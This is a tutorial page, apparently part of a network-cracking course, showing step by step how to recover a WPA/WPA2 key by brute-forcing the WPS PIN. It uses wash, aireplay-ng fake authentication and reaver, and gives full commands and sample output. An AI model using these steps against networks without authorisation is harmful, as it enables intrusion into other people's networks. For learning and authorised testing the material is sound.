---
title: Cracking WPA and WPA2 Without a Wordlist
type: default
layout: page
child: Cracking
fold: Network Cracking
---

Now that we know what WPS is and how it can be used to recover the password for
WPA and WPA2 networks, let's see how to do that in practise.

Usually, we use airodump-ng to see all the networks around us, but now we want
to see the networks that have WPS enabled. We will be using a tool called _wash_
to display all the networks around us that have WPS enabled. So, let's execute:

```bash
wash --interface wlp2s0mon
```

What that command does, is execute a tool called _wash_ and we are also
specifying our wireless interface set in monitor mode, in my case _wlp2s0mon_.
If we execute that command, we should get an output like the following:

```bash
Wash v1.4 WiFi Protected Setup Scan Tool
Copyright (c) 2011, Tactical Network Solutions, Craig Heffner <cheffner@tacnetsol.com>

BSSID                  Channel       RSSI       WPS Version       WPS Locked        ESSID
---------------------------------------------------------------------------------------------------------------
9C:C8:FC:4D:10:CA      6              -53       1.0               No                TIGO-7A54
```

As you can see, _wash_ returned one network _TIGO-7A54_ which is my target
network, that means, that it has WPS on.

Its output shows us several important things, such as the value of "_WPS
Locked_" which tell us whether WPS is locked or not because sometimes WPS locks
after a number of failed attempts, if its value is "No" it means that we can go
ahead and try to guess the PIN. It also gives us the version WPS, it is using
the version 1.0 and it shows some other values we already know, such as the
_Channel_ and the _BSSID_.

Now that we know our target uses WPS, there is a good chance that this attack
will work against it, the only reason it could fail is if the target uses _PBC_
or _Push Button Authentication_, if it does, it will refuse all the entered
PINs unless the button is pressed on the router. The only way to know if it uses
_PBC_ is so try this attack and see if it works.

First, we'll need to copy the BSSID of our network (in my case it is
_9C:C8:FC:4D:10:CA_) and we'll also need to be associated with the network using
a _Fake Authentication Attack_, we already did this before and we are going to
use the exact same command.

We are going to use _aireplay-ng_ and we are going to tell it that we want to
perform a Fake Authentication attack so we specify the argument _--fakeauth_, we
are going to give it the delay, this is basically the time to wait between
association attempts, previously we set it to 0 and we had to run this command
manually every now and then, now I am going to set it to 30 so we will associate
with the target network every 30 seconds, then we'll use the _-a_ argument to
set the MAC address of my target network and _-h_ to set the MAC of my wireless
adapter. The command looks like this:

```bash
aireplay-ng --fakeauth 30 -a 9C:C8:FC:4D:10:CA -h 80:C5:F2:6B:50:8D wlp2s0mon
```

The command is ready we are not going to execute it yet. Open another terminal
and run _reaver_ which is the program that will bruteforce (_guess_) the PIN for
us and only then, we'll associate with the network, because otherwise
_aireplay-ng_ will fail to associate with my network.

In the another terminal, we will execute _Reaver_ which is the program that will
bruteforce the PIN, it's going to try every possible PIN until it gets the right
one and once it has the right PIN, it will use it to compute the WPA key.

Using _Reaver_ is very simple, first, we'll type the program name (_reaver_)
then we'll use the _--bssid_ argument to set the BSSID of our target network,
then, we'll use the _--channel_ argument, to specify the channel in which our
target is being executed, then we'll use the _--interface_ argument to set the
name of our interface in monitor mode. That command looks like this:

```bash
reaver --bssid 9C:C8:FC:4F:10:CA --channel 6 --interface wlp2s0mon
```

Other than that, we'll append two more arguments which are _-vvv_ to show us as
much information as possible (also known as _verbose mode_) and we'll also
append _--no-associate_ to tell _Reaver_ not to associate with the target
network because we are going to do it manually. Reaver can automatically
associate with the network but it usually fails a lot, therefore, it is better
to associate to the network manually. The final command looks like this:

```bash
reaver --bssid 9C:C8:FC:4F:10:CA --channel 6 --interface wlp2s0mon -vvv --no-associate
```

Now, we are going to execute the _reaver_'s command and then, we'll associate
ourselves with the network. A portion of the _reaver_'s output looks like this:

```bash

Reaver v1.6.1 WiFi Protected Setup Attack Tool
Copyright (c) 2011, Tactical Network Solutions, Craig Heffner <cheffner@tacnetsol.com>

[+] Switching wlp2s0mon to channel 6
[+] Waiting for beacom from 9C:C8:FC:4F:10:CA
[+] Associated with 9C:C8:FC:4F:10:CA (ESSID: TIGO-7A54)
[+] Trying pin "12345670"
[+] Sending EAPOL START request
[+] Received identity request
[+] Sending identity response
[!] WARNING: Receive timeout occurred
[+] Sending WSC NACK
[!] WPS transaction failed (code: 0x02), re-trying last pin

```

Once it finds the PIN you'd get an output like the following:

```bash
[+] Trying ping "12345670"
[+] Sending EAPOL START request
[+] Received identity request
[+] Sending identity response
[+] Received M1 message
[+] Sending M2 message
[+] Received M3 message
[+] Sending M4 message
[+] Received M5 message
[+] Sending M6 message
[+] Received M7 message
[+] Sending WSC NACK
[+] Sending WSC NACK
[+] Pin cracked in 57 seconds
[+] WPS PIN: '12345670'
[+] WPA PSK: 'passw123'
[+] AP SSID: 'TIGO-7A54'
[+] Nothing done, nothing to save
```

As you can see, the PIN was 12345670, from that, it was able to discover the WPA
key which is "passw123" and the name of the router is "TIGO-7A54", so now we can
go ahead and connect with that password.
